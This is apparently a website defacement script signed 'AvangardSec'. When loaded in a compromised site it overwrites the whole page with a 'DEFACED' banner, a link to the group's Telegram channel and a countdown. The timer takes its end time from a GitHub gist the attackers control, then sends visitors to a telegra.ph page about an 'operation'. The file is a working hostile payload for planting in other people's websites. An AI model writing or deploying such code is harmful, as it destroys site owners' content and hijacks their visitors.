(function(){
'use strict';
document.open();
document.write('<!DOCTYPE html><html>');
document.write('<head><meta charset="UTF-8"><title>AvangardSec</title>');
document.write(`
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#ccc;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px;background:radial-gradient(ellipse at center,#2a2a2a 0%,#111 50%,#000 100%)}
.container{background:#1a1a1a;padding:3rem 4rem;border:1px solid #444;border-radius:8px;max-width:700px;width:100%;box-shadow:0 0 30px rgba(255,255,255,0.03),inset 0 0 30px rgba(0,0,0,0.8)}
.glitched{font-size:3.5rem;font-weight:700;color:#ccc;text-shadow:0 0 5px rgba(255,255,255,0.2);letter-spacing:8px;text-transform:uppercase;margin-bottom:0.5rem}
.sub{font-size:1rem;color:#888;letter-spacing:4px;text-transform:uppercase;border-bottom:1px solid #333;padding-bottom:1rem;margin-bottom:2rem}
.apk-btn{display:inline-block;background:#2a2a2a;color:#ddd;font-size:2rem;font-weight:bold;padding:0.5rem 2.5rem;margin-bottom:2.5rem;border:1px solid #555;border-radius:4px;text-decoration:none;letter-spacing:10px;transition:0.3s;font-family:'Courier New',monospace;box-shadow:0 0 15px rgba(255,255,255,0.05)}
.apk-btn:hover{background:#333;border-color:#888;color:#fff;box-shadow:0 0 25px rgba(255,255,255,0.1)}
.timer{font-size:5.5rem;font-weight:700;color:#ddd;background:#0d0d0d;padding:0.5rem 1.5rem;border:1px solid #444;border-radius:6px;display:inline-block;letter-spacing:6px;font-variant-numeric:tabular-nums;box-shadow:inset 0 0 20px rgba(0,0,0,0.9);min-width:280px;background:#111}
.timer .ms{font-size:2.5rem;color:#666}
.timer-label{display:block;margin-top:0.8rem;color:#666;font-size:0.9rem;letter-spacing:3px;text-transform:uppercase}
.footer{margin-top:2.5rem;color:#444;font-size:0.7rem;letter-spacing:2px;border-top:1px solid #222;padding-top:1.5rem}
.footer span{margin:0 1rem}
@media(max-width:600px){.container{padding:2rem 1.5rem}.glitched{font-size:2.8rem;letter-spacing:5px}.timer{font-size:3.8rem;padding:0.4rem 1rem;min-width:auto}.timer .ms{font-size:1.8rem}.apk-btn{font-size:1.5rem;padding:0.4rem 1.5rem;letter-spacing:6px}}
</style>
</head><body>
`);
document.write(`
<div class="container">
<div class="glitched">DEFACED</div>
<div class="sub">// AvangardSec //</div>
<a href="https://t.me/AvangardsSec" target="_blank" rel="noopener" class="apk-btn">A/P/K</a>
<div>
<div class="timer" id="countdown">--:--:--<span class="ms">.---</span></div>
<span class="timer-label">ОСТАЛОСЬ ДО ЗАВЕРШЕНИЯ</span>
</div>
<div class="footer"><span>0x7F</span><span>root@defaced:~#</span><span>2026-06-24</span></div>
</div>
`);
document.write(`
<script>
(function(){
const TIME_SOURCE='https://gist.githubusercontent.com/AvangardSec1/40b45daeef3eabb14a5ce7706d0e7733/raw/end.txt';
const REDIRECT_URL='https://telegra.ph/Operaciya-Bloodborne-06-07';
let endTime=null;
const el=document.getElementById('countdown');
function pad(n,l=2){return String(n).padStart(l,'0')}
async function fetchEndTime(){
try{
const url=TIME_SOURCE+(TIME_SOURCE.includes('?')?'&':'?')+'_='+Date.now();
const r=await fetch(url,{cache:'no-store'});
if(!r.ok)return null;
const t=await r.text();
const m=t.match(/(\\d{4})-(\\d{2})-(\\d{2})T(\\d{2}):(\\d{2}):(\\d{2})/);
if(!m)return null;
const d=new Date(m[1]+'-'+m[2]+'-'+m[3]+'T'+m[4]+':'+m[5]+':'+m[6]);
return d.getTime();
}catch(e){return null}
}
function updateTimer(){
if(!endTime){el.innerHTML='--:--:--<span class=\"ms\">.---</span>';return}
const diff=endTime-Date.now();
if(diff<=0){window.location.href=REDIRECT_URL;return}
const h=Math.floor(diff/3600000);
const m=Math.floor((diff%3600000)/60000);
const s=Math.floor((diff%60000)/1000);
const ms=diff%1000;
el.innerHTML=pad(h)+':'+pad(m)+':'+pad(s)+'<span class=\"ms\">.'+pad(ms,3)+'</span>';
}
(async function(){
endTime=await fetchEndTime()||Date.now()+3600000;
setInterval(updateTimer,30);
updateTimer();
setInterval(async ()=>{const t=await fetchEndTime();if(t)endTime=t},120000);
})();
})();
<\/script>
`);
document.write('</body></html>');
document.close();
})();
